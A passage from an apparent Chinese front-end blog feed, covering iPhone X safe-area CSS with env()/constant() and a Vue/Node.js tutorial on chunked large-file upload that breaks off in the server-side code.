src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635694-436826a6-fcfc-4a5c-baf9-bac3a995e66c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635694-436826a6-fcfc-4a5c-baf9-bac3a995e66c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><ul><li>constant(safe-area-inset-top)：在 Viewport 顶部的安全区域内设置量（CSS 像素）</li><li>constant(safe-area-inset-bottom)：在 Viewport 底部的安全区域内设置量（CSS 像素）</li><li>constant(safe-area-inset-left)：在 Viewport 左边的安全区域内设置量（CSS 像素）</li><li>constant(safe-area-inset-right)：在 Viewport 右边的安全区域内设置量（CSS 像素）</li><li><br /></li></ul><p>简单来说我们可以通过 constant( ) 可以获取到非安全边距，再结合 padding 或 margin 来控制页面元素避开非安全区域。 Webkit 在 iOS11 中新增 CSS Functions: env( ) 替代 constant( )，文档中推荐使用 env( )，而 constant( ) 从 Safari Techology Preview 41 和 iOS11.2 Beta 开始会被弃用。在不支持 env( ) 的浏览器中，会自动忽略这一样式规则，不影响网页正常的渲染。为了达到最大兼容目的，我们可以 constant( ) 和 env( ) 同时使用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.footerClass</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">constant</span>(safe-area-inset-bottom); <span class="comment">/* iOS 11.0 */</span></span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">env</span>(safe-area-inset-bottom); <span class="comment">/* iOS 11.2 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="lVFnh"></a></p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><a name="ei1Oe"></a></p><h4 id="1-设置网页在可视区域的布局方式"><a href="#1-设置网页在可视区域的布局方式" class="headerlink" title="1.设置网页在可视区域的布局方式"></a>1.设置网页在可视区域的布局方式</h4><p>新增 viweport-fit 属性，使得页面内容完全覆盖整个窗口：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; <span class="attribute">content</span>=&quot;<span class="attribute">width</span>=device-<span class="attribute">width</span>, initial-scale=<span class="number">1.0</span>, viewport-fit=cover, minimum-scale=<span class="number">1</span>, maximum-scale=<span class="number">1.0</span>, user-scalable=<span class="number">0</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p><a name="YdtfC"></a></p><h4 id="2-让主体内容控制在安全区域内"><a href="#2-让主体内容控制在安全区域内" class="headerlink" title="2.让主体内容控制在安全区域内"></a>2.让主体内容控制在安全区域内</h4><p>假设我们的底部按钮高度是 50px：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="built_in">env</span>(safe-area-inset-top);</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="built_in">env</span>(safe-area-inset-right);</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">50px</span>; <span class="comment">/* 兼容不支持 env( ) 的设备  */</span></span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">calc</span>(</span><br><span class="line">    <span class="built_in">env</span>(safe-area-inset-bottom) + <span class="number">50px</span></span><br><span class="line">  ); <span class="comment">/* 在 iphone x + 中本句才会生效 */</span></span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="built_in">env</span>(safe-area-inset-left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个关键点：</p><ol><li>写在前面的 padding-bottom: 50px 为了兼容没有底部胡子的设备，让主体内容偏移出底部按钮的高度，避免按钮遮挡内容。</li><li><code>padding-bottom: calc(env(safe-area-inset-bottom) + 50px);</code> 计算 底部非安全区域距离 与 底部按钮高度 之和 来做为 <code>padding-bottom</code>值，如果设备支持 env，那么 calc 会计算出一个合法的值，本句的优先级则最高，会覆盖前面的 <code>padding-bottom: 50px</code>。否则 calc 会计算出一个不合法的值，则本句声明不会生效。这样在不支持 env 设备中也可以达到兼容的目的。</li></ol><p>目前到这，在横屏场景下左侧的内容就不会被刘海遮挡住了：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635706-86150bda-7c7b-445b-8d0e-c11ff52e1d77.png#averageHue=%238c9c83&clientId=u30bf360d-bf01-4&from=paste&id=uf3b439d5&originHeight=544&originWidth=960&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf1e4d04d-c750-41c8-8b26-eda83b6e1c8&title=" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635706-86150bda-7c7b-445b-8d0e-c11ff52e1d77.png#averageHue=%238c9c83&clientId=u30bf360d-bf01-4&from=paste&id=uf3b439d5&originHeight=544&originWidth=960&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf1e4d04d-c750-41c8-8b26-eda83b6e1c8&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="nvhAH"></a></p><h4 id="3-底部按钮的处理"><a href="#3-底部按钮的处理" class="headerlink" title="3.底部按钮的处理"></a>3.底部按钮的处理</h4><p>首先给底部按钮一个外层容器 .btn-container ，设置样式时其中有几点比较关键：</p><ol><li>设置<code>padding-bottom: env(safe-area-inset-bottom);</code>增加一个 padding 值，让底部向外扩展一个非安全区域的距离。</li><li>设置<code>background: #FFF</code> 让整个 <code>.btn-container</code>背景为白色（包括刚新增的 <code>padding-bottom</code> 的区域）这样就可以遮挡住了底部内容。</li><li>设置 <code>box-sizing: content-box;</code>，因为在通常情况下 css 在 reset 阶段一般都设置了<code>* &#123;box-sizing: border-box;&#125;</code>这样一来设置 padding 就不能向外扩展距离了，所以在这里我们要把他改回 <code>content-box</code>。</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn-container</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="built_in">env</span>(safe-area-inset-bottom);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#00c340</span>;</span><br><span class="line">  <span class="attribute">border</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终效果如图所示<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635866-dc17d470-498c-41cb-b62e-4095ded62ab9.png#averageHue=%2399a694&clientId=u30bf360d-bf01-4&from=paste&id=u918115cd&originHeight=960&originWidth=544&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u87459362-8a26-445e-b7fd-dc906a20d61&title=" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635866-dc17d470-498c-41cb-b62e-4095ded62ab9.png#averageHue=%2399a694&clientId=u30bf360d-bf01-4&from=paste&id=u918115cd&originHeight=960&originWidth=544&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u87459362-8a26-445e-b7fd-dc906a20d61&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在 safari 中，页面往上稍滑动一点，出现 safari 的操作栏后，底部按钮依然会紧贴着操作栏：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635821-83d98fec-a439-45dc-bace-df3849d54600.png#averageHue=%238c9484&clientId=u30bf360d-bf01-4&from=paste&id=u44f16efe&originHeight=799&originWidth=453&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u72633772-beb4-4a1b-8a0e-e8023da51b1&title=" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1666081635821-83d98fec-a439-45dc-bace-df3849d54600.png#averageHue=%238c9484&clientId=u30bf360d-bf01-4&from=paste&id=u44f16efe&originHeight=799&originWidth=453&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u72633772-beb4-4a1b-8a0e-e8023da51b1&title=" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="AYsAZ"></a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://link.juejin.cn/?target=https://www.jianshu.com/p/a1e8c7cf8821">如何适配 iPhone X</a><br /><a href="https://link.juejin.cn/?target=https://www.w3.org/TR/css-round-display-1/%23viewport-fit-descriptor">CSS Round Display Level 1</a><br /><a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/conflicting/Web/CSS/@viewport_a33ee59ffd8336ffb3336900dea02e9f">viewport-fit</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兼容 </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大文件上传和断点续传</title>
      <link href="/2022/06/21/solution/da-wen-jian-shang-chuan-he-duan-dian-xu-chuan/"/>
      <url>/2022/06/21/solution/da-wen-jian-shang-chuan-he-duan-dian-xu-chuan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="WK3tc"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间面试官都挺忙的，频频出现在博客文章标题，虽然我不是特别想蹭热度，但是实在想不到好的标题了-。-，蹭蹭就蹭蹭 :)<br />事实上我在面试的时候确实被问到了这个问题，而且是一道在线 coding 的编程题，当时虽然思路正确，可惜最终也并不算完全答对<br />结束后花了一段时间整理了下思路，那么究竟该如何实现一个大文件上传，以及在上传中如何实现断点续传的功能呢？<br />本文将从零搭建前端和服务端，实现一个大文件上传和断点续传的 demo<br />前端：<code>vue</code> <code>element-ui</code><br />服务端：<code>nodejs</code><br /><code>文章有误解的地方，欢迎指出，将在第一时间改正，有更好的实现方式希望留下你的评论</code><br><a name="Jwoal"></a></p><h1 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h1><p><a name="XRJsf"></a></p><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p><a name="qPQ6M"></a></p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>前端大文件上传网上的大部分文章已经给出了解决方案，核心是<code>利用 Blob.prototype.slice</code> 方法，和数组的 slice 方法相似，调用的 slice 方法可以返回<code>原文件的某个切片</code><br />这样我们就可以根据预先设置好的切片最大数量将文件切分为一个个切片，然后借助 http 的可并发性，同时上传多个切片，这样从原本传一个大文件，变成了<code>同时</code>传多个小的文件切片，可以大大减少上传时间<br />另外由于是并发，传输到服务端的顺序可能会发生变化，所以我们还需要给每个切片记录顺序<br><a name="ZNFD9"></a></p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端需要负责接受这些切片，并在接收到所有切片后<code>合并</code>切片<br />这里又引伸出两个问题</p><ol><li>何时合并切片，即切片什么时候传输完成</li><li>如何合并切片</li></ol><p>第一个问题需要前端进行配合，前端在每个切片中都携带切片最大数量的信息，当服务端接受到这个数量的切片时自动合并，也可以额外发一个请求主动通知服务端进行切片的合并<br />第二个问题，具体如何合并切片呢？这里可以使用 nodejs 的 读写流（readStream&#x2F;writeStream），将所有切片的流传输到最终文件的流里<br /><code>talk is cheap,show me the code</code>，接着我们用代码实现上面的思路<br><a name="ncRhr"></a></p><h2 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h2><p>前端使用 Vue 作为开发框架，对界面没有太大要求，原生也可以，考虑到美观使用 element-ui 作为 UI 框架<br><a name="Tk50G"></a></p><h3 id="上传控件"><a href="#上传控件" class="headerlink" title="上传控件"></a>上传控件</h3><p>首先创建选择文件的控件，监听 change 事件以及上传按钮</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      handleFileChange(e) &#123;</span><br><span class="line">        const [file] = e.target.files;</span><br><span class="line">        if (!file) return;</span><br><span class="line">        Object.assign(this.$data, this.$options.data());</span><br><span class="line">        this.container.file = file;</span><br><span class="line">      &#125;,</span><br><span class="line">      async handleUpload() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300740-6910ec20-d65c-43f8-8267-b7cd21ab7694.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/webp/164572/1588598300740-6910ec20-d65c-43f8-8267-b7cd21ab7694.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Ks79D"></a></p><h3 id="请求逻辑"><a href="#请求逻辑" class="headerlink" title="请求逻辑"></a>请求逻辑</h3><p>考虑到通用性，这里没有用第三方的请求库，而是用原生 XMLHttpRequest 做一层简单的封装来发请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">request(&#123;</span><br><span class="line">  url,</span><br><span class="line">  method = &quot;post&quot;,</span><br><span class="line">  data,</span><br><span class="line">  headers = &#123;&#125;,</span><br><span class="line">  requestList</span><br><span class="line">&#125;) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; &#123;</span><br><span class="line">    const xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.open(method, url);</span><br><span class="line">    Object.keys(headers).forEach(key =&gt;</span><br><span class="line">      xhr.setRequestHeader(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.send(data);</span><br><span class="line">    xhr.onload = e =&gt; &#123;</span><br><span class="line">      resolve(&#123;</span><br><span class="line">        data: e.target.response</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="sH0vD"></a></p><h3 id="上传切片"><a href="#上传切片" class="headerlink" title="上传切片"></a>上传切片</h3><p>接着实现比较重要的上传功能，上传需要做两件事</p><ul><li>对文件进行切片</li><li>将切片传输给服务端</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  + const SIZE = 10 * 1024 * 1024; // 切片大小</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;，</span><br><span class="line">           data: []</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      request() &#123;&#125;,</span><br><span class="line">      handleFileChange() &#123;&#125;,</span><br><span class="line">          // 生成文件切片</span><br><span class="line">          createFileChunk(file, size = SIZE) &#123;</span><br><span class="line">           const fileChunkList = [];</span><br><span class="line">        let cur = 0;</span><br><span class="line">        while (cur &lt; file.size) &#123;</span><br><span class="line">            fileChunkList.push(&#123; file: file.slice(cur, cur + size) &#125;);</span><br><span class="line">            cur += size;</span><br><span class="line">          &#125;</span><br><span class="line">        return fileChunkList;</span><br><span class="line">      &#125;,</span><br><span class="line">       // 上传切片</span><br><span class="line">        async uploadChunks() &#123;</span><br><span class="line">          const requestList = this.data</span><br><span class="line">             .map((&#123; chunk，hash &#125;) =&gt; &#123;</span><br><span class="line">                  const formData = new FormData();</span><br><span class="line">                  formData.append(&quot;chunk&quot;, chunk);</span><br><span class="line">                  formData.append(&quot;hash&quot;, hash);</span><br><span class="line">                  formData.append(&quot;filename&quot;, this.container.file.name);</span><br><span class="line">                  return &#123; formData &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">              .map(async (&#123; formData &#125;) =&gt;</span><br><span class="line">                  this.request(&#123;</span><br><span class="line">                      url: &quot;http://localhost:3000&quot;,</span><br><span class="line">                      data: formData</span><br><span class="line">                      &#125;)</span><br><span class="line">                );</span><br><span class="line">          await Promise.all(requestList); // 并发切片</span><br><span class="line">        &#125;,</span><br><span class="line">          async handleUpload() &#123;</span><br><span class="line">            if (!this.container.file) return;</span><br><span class="line">            const fileChunkList = this.createFileChunk(this.container.file);</span><br><span class="line">            this.data = fileChunkList.map((&#123; file &#125;，index) =&gt; (&#123;</span><br><span class="line">                chunk: file,</span><br><span class="line">                hash: this.container.file.name + &quot;-&quot; + index // 文件名 + 数组下标</span><br><span class="line">                &#125;));</span><br><span class="line">            await this.uploadChunks();</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当点击上传按钮时，调用 <code>createFileChunk</code> 将文件切片，切片数量通过文件大小控制，这里设置 10MB，也就是说 100 MB 的文件会被分成 10 个切片<br />createFileChunk 内使用 while 循环和 slice 方法将切片放入 <code>fileChunkList</code> 数组中返回<br />在生成文件切片时，需要给每个切片一个标识作为 hash，这里暂时使用<code>文件名 + 下标</code>，这样后端可以知道当前切片是第几个切片，用于之后的合并切片<br />随后调用 <code>uploadChunks</code> 上传所有的文件切片，将文件切片，切片 hash，以及文件名放入 FormData 中，再调用上一步的 <code>request</code> 函数返回一个 proimise，最后调用 Promise.all 并发上传所有的切片<br><a name="KHpY4"></a></p><h3 id="发送合并请求"><a href="#发送合并请求" class="headerlink" title="发送合并请求"></a>发送合并请求</h3><p>这里使用整体思路中提到的第二种合并切片的方式，即前端主动通知服务端进行合并，所以前端还需要额外发请求，服务端接受到这个请求时主动合并切片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; @change=&quot;handleFileChange&quot; /&gt;</span><br><span class="line">      &lt;el-button @click=&quot;handleUpload&quot;&gt;上传&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    data: () =&gt; (&#123;</span><br><span class="line">      container: &#123;</span><br><span class="line">        file: null</span><br><span class="line">      &#125;,</span><br><span class="line">      data: []</span><br><span class="line">    &#125;),</span><br><span class="line">    methods: &#123;</span><br><span class="line">      request() &#123;&#125;,</span><br><span class="line">      handleFileChange() &#123;&#125;,</span><br><span class="line">      createFileChunk() &#123;&#125;,</span><br><span class="line">      // 上传切片，同时过滤已上传的切片</span><br><span class="line">      async uploadChunks() &#123;</span><br><span class="line">        const requestList = this.data</span><br><span class="line">          .map((&#123; chunk，hash &#125;) =&gt; &#123;</span><br><span class="line">            const formData = new FormData();</span><br><span class="line">            formData.append(&quot;chunk&quot;, chunk);</span><br><span class="line">            formData.append(&quot;hash&quot;, hash);</span><br><span class="line">            formData.append(&quot;filename&quot;, this.container.file.name);</span><br><span class="line">            return &#123; formData &#125;;</span><br><span class="line">          &#125;)</span><br><span class="line">          .map(async (&#123; formData &#125;) =&gt;</span><br><span class="line">            this.request(&#123;</span><br><span class="line">              url: &quot;http://localhost:3000&quot;,</span><br><span class="line">              data: formData</span><br><span class="line">            &#125;)</span><br><span class="line">              );</span><br><span class="line">        await Promise.all(requestList);</span><br><span class="line">              // 合并切片</span><br><span class="line">        await this.mergeRequest();</span><br><span class="line">      &#125;,</span><br><span class="line">        async mergeRequest() &#123;</span><br><span class="line">            await this.request(&#123;</span><br><span class="line">                url: &quot;http://localhost:3000/merge&quot;,</span><br><span class="line">                 headers: &#123;</span><br><span class="line">                      &quot;content-type&quot;: &quot;application/json&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                                       data: JSON.stringify(&#123;</span><br><span class="line">                                              filename: this.container.file.name</span><br><span class="line">                                              &#125;)</span><br><span class="line">                                        &#125;);</span><br><span class="line">            &#125;,</span><br><span class="line">      async handleUpload() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><a name="W8bY3"></a></p><h2 id="服务端部分"><a href="#服务端部分" class="headerlink" title="服务端部分"></a>服务端部分</h2><p>简单使用 http 模块搭建服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br></pre></td></tr></table></figure><p><a name="NckM5"></a></p><h3 id="接受切片"><a href="#接受切片" class="headerlink" title="接受切片"></a>接受切片</h3><p>使用 <code>multiparty</code> 包处理前端传来的 FormData<br />在 multiparty.parse 的回调中，files 参数保存了 FormData 中文件，fields 参数保存了 FormData 中非文件的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 